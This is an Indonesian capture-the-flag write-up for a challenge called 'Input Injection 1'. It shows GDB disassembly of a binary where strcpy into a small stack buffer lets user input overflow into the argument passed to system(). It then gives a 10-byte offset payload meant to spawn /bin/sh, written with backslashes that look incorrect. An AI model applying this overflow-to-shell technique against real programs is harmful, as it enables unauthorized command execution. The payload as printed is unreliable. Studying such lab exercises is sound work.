# Input Injection 1
## problem
```
gef➤  disas main
Dump of assembler code for function main:
   0x00000000004011f6 <+0>:	endbr64
   0x00000000004011fa <+4>:	push   rbp
   0x00000000004011fb <+5>:	mov    rbp,rsp
   0x00000000004011fe <+8>:	sub    rsp,0xd0
   0x0000000000401205 <+15>:	lea    rdi,[rip+0xdf8]        # 0x402004
   0x000000000040120c <+22>:	call   0x4010b0 <puts@plt>
   0x0000000000401211 <+27>:	mov    rax,QWORD PTR [rip+0x2e48]        # 0x404060 <stdout@@GLIBC_2.2.5>
   0x0000000000401218 <+34>:	mov    rdi,rax
   0x000000000040121b <+37>:	call   0x401100 <fflush@plt>
   0x0000000000401220 <+42>:	mov    rdx,QWORD PTR [rip+0x2e49]        # 0x404070 <stdin@@GLIBC_2.2.5>
   0x0000000000401227 <+49>:	lea    rax,[rbp-0xd0]
   0x000000000040122e <+56>:	mov    esi,0xc8
   0x0000000000401233 <+61>:	mov    rdi,rax
   0x0000000000401236 <+64>:	call   0x4010f0 <fgets@plt>
   0x000000000040123b <+69>:	lea    rax,[rbp-0xd0]
   0x0000000000401242 <+76>:	lea    rsi,[rip+0xdce]        # 0x402017
   0x0000000000401249 <+83>:	mov    rdi,rax
   0x000000000040124c <+86>:	call   0x4010e0 <strcspn@plt>
   0x0000000000401251 <+91>:	mov    BYTE PTR [rbp+rax*1-0xd0],0x0
   0x0000000000401259 <+99>:	lea    rax,[rbp-0xd0]
   0x0000000000401260 <+106>:	lea    rsi,[rip+0xdb2]        # 0x402019
   0x0000000000401267 <+113>:	mov    rdi,rax
   0x000000000040126a <+116>:	call   0x401276 <fun>
   0x000000000040126f <+121>:	mov    eax,0x0
   0x0000000000401274 <+126>:	leave
   0x0000000000401275 <+127>:	ret
End of assembler dump.
```
```
gef➤  disas fun
Dump of assembler code for function fun:
   0x0000000000401276 <+0>:	endbr64
   0x000000000040127a <+4>:	push   rbp
   0x000000000040127b <+5>:	mov    rbp,rsp
   0x000000000040127e <+8>:	sub    rsp,0x30
   0x0000000000401282 <+12>:	mov    QWORD PTR [rbp-0x28],rdi
   0x0000000000401286 <+16>:	mov    QWORD PTR [rbp-0x30],rsi
   0x000000000040128a <+20>:	mov    rdx,QWORD PTR [rbp-0x30]
   0x000000000040128e <+24>:	lea    rax,[rbp-0xa]
   0x0000000000401292 <+28>:	mov    rsi,rdx
   0x0000000000401295 <+31>:	mov    rdi,rax
   0x0000000000401298 <+34>:	call   0x4010a0 <strcpy@plt>
   0x000000000040129d <+39>:	mov    rdx,QWORD PTR [rbp-0x28]
   0x00000000004012a1 <+43>:	lea    rax,[rbp-0x14]
   0x00000000004012a5 <+47>:	mov    rsi,rdx
   0x00000000004012a8 <+50>:	mov    rdi,rax
   0x00000000004012ab <+53>:	call   0x4010a0 <strcpy@plt>
   0x00000000004012b0 <+58>:	lea    rax,[rbp-0x14]
   0x00000000004012b4 <+62>:	mov    rsi,rax
   0x00000000004012b7 <+65>:	lea    rdi,[rip+0xd61]        # 0x40201f
   0x00000000004012be <+72>:	mov    eax,0x0
   0x00000000004012c3 <+77>:	call   0x4010d0 <printf@plt>
   0x00000000004012c8 <+82>:	mov    rax,QWORD PTR [rip+0x2d91]        # 0x404060 <stdout@@GLIBC_2.2.5>
   0x00000000004012cf <+89>:	mov    rdi,rax
   0x00000000004012d2 <+92>:	call   0x401100 <fflush@plt>
   0x00000000004012d7 <+97>:	lea    rax,[rbp-0xa]
   0x00000000004012db <+101>:	mov    rdi,rax
=> 0x00000000004012de <+104>:	call   0x4010c0 <system@plt>
   0x00000000004012e3 <+109>:	nop
   0x00000000004012e4 <+110>:	leave
   0x00000000004012e5 <+111>:	ret
End of assembler dump.

```

## solusi
### Diketahui
Kita bisa melihat bahwa terdapat fungsi system yang dipanggil di address *fun+104, hal ini bisa menjadi kesempatan bagi kita untuk mengontrol penuh sistem jika kita bisa memasukkan \"/bin/sh\" sebagai parameternya
### Tes
* set breakpoint di *fun+104
* r < <(echo "Overflow String, terserah mau pake apapun")
* cek rdi, pass untuk melihat offset
* setelah tau offset maka kita bisa membuat payload berdasarkan offset tersebut
### Payload
(offsetnya 10)\
1234567890\bin\sh